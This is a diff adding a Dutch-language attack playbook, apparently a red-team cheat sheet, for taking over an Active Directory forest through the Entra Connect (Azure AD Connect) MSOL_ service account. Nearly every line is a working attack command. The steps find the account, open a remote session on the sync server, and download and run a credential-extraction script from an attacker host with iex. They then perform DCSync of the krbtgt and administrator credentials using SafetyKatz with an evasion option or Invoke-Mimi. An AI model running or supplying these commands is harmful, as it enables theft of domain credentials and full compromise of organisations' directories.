@@ -1,0 +1,43 @@
+# Entra Connect (Azure AD Connect) — Credential extractie
+# Extraheer cleartext wachtwoord van de MSOL_ service account voor DCSync
+
+# === Enumeratie ===
+
+# Vind het MSOL_ account (AD Module)
+Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server FOREST_ROOT_DOMAIN -Properties * | select SamAccountName,Description | fl
+
+# Het MSOL_ account heeft standaard DCSync rechten op het forest root domein
+
+# === Stap 1: Identificeer de AD Connect machine ===
+# De Description van het MSOL_ account bevat de servernaam
+# Voorbeeld: "Account created by ... on server YOURSERVER"
+
+# === Stap 2: Verkrijg toegang tot de AD Connect machine ===
+# Via PSRemoting, WinRM, of laterale beweging
+Enter-PSSession -ComputerName ADCONNECT_SERVER
+
+# === Stap 3: Extraheer credentials (op de AD Connect machine) ===
+
+# Download en run adconnect.ps1 (@_xpn_ POC)
+iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/adconnect.ps1')
+ADconnect
+
+# Dit levert:
+# - Domain: FOREST_ROOT_DOMAIN
+# - Username: MSOL_xxxxxxxxxx
+# - Password: [cleartext wachtwoord]
+
+# === Stap 4: DCSync met MSOL_ credentials ===
+
+# Optie A: runas + SafetyKatz (elevated)
+runas /user:FOREST_ROOT_DOMAIN\MSOL_ACCOUNT /netonly cmd
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:DOMAIN\krbtgt /domain:DOMAIN" "exit"
+
+# Optie B: Invoke-Mimi (zonder elevatie)
+. C:\AD\Tools\Invoke-Mimi.ps1
+Invoke-Mimi -Command '"lsadump::dcsync /user:DOMAIN\administrator /domain:DOMAIN"'
+
+# Noot: MSOL_ account heeft Replicating Directory Changes + Replicating Directory Changes All
+# Noot: adconnect.ps1 query't de lokale ADSync database via LocalDB
+# Noot: Werkt op zowel de oude Azure AD Connect als nieuwe Entra Connect
+# Noot: Vereist local admin op de AD Connect machine
